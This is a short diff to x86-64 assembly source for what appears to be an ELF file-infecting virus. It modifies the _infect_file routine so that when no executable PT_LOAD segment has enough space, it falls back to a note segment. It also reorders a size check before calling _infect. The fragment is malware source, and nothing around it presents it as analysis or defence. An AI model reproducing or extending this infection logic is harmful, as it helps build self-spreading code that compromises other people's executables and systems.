@@ -771,7 +771,7 @@ _infect_file: ; (string rdi, stat rsi)
 		.find_segment_exec:
 			inc rcx
 			cmp rcx, rax
-			jge .unmap
+			jge .get_segment_note
 			cmp dword[rbx], PT_LOAD ; p_type != PT_LOAD
 			jne .next
 			mov dx, [rbx + P_FLAGS]; p_flags
@@ -882,9 +882,10 @@ _infect_file: ; (string rdi, stat rsi)
 			add rdi, r13 ; addr pointer -> mmap
 
 			xor r9, r9
-			mov rdx, r14
-			cmp rsi, rdx
+			cmp rsi, r14
 			jl .get_segment_exec ; if size between PT_LOAD isn't enough, search another segment
+			mov rdx, r14
+
 			push r11
 			xor r11, r11; mode PT_LOAD
 			call _infect
